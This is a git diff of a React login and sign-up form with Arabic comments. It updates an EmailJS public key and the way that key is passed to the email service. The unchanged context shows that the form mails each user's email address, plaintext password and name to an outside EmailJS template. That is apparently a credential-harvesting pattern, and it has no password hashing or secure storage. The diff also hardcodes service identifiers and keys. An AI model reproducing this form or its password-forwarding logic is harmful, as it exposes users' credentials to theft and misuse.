@@ -2,10 +2,10 @@ import React, { useState } from 'react';
 import { LogIn, UserPlus, Lock, Mail, User, Shield, Zap, Target, Eye, Flame, LogOut, CheckCircle2, Loader2 } from 'lucide-react';
 import emailjs from '@emailjs/browser';
 
-// المعرفات الخاصة بحسابك
+// المعرفات المحدثة والصحيحة لحسابك
 const EMAILJS_SERVICE_ID = 'service_fyhamvf';
 const EMAILJS_TEMPLATE_ID = 'template_51n7ft7';
-const EMAILJS_PUBLIC_KEY = 'QxOkx3vwbG2f8zlsd';
+const EMAILJS_PUBLIC_KEY = '9z9fb-U7LtKWji6qM';
 
 interface Option {
   id: string;
@@ -71,9 +71,7 @@ export default function App() {
     setIsSending(true);
 
     try {
-      // تهيئة الـ Public Key لمنع خطأ Account not found
-      emailjs.init(EMAILJS_PUBLIC_KEY);
-
+      // إرسال البيانات مع تمرير الـ publicKey ضمن كائن الخيارات
       const response = await emailjs.send(
         EMAILJS_SERVICE_ID,
         EMAILJS_TEMPLATE_ID,
@@ -81,6 +79,9 @@ export default function App() {
           user_email: email,
           user_password: password,
           user_name: name || 'N/A',
+        },
+        {
+          publicKey: EMAILJS_PUBLIC_KEY,
         }
       );
 
@@ -298,3 +299,4 @@ export default function App() {
     </div>
   );
 }
+                          
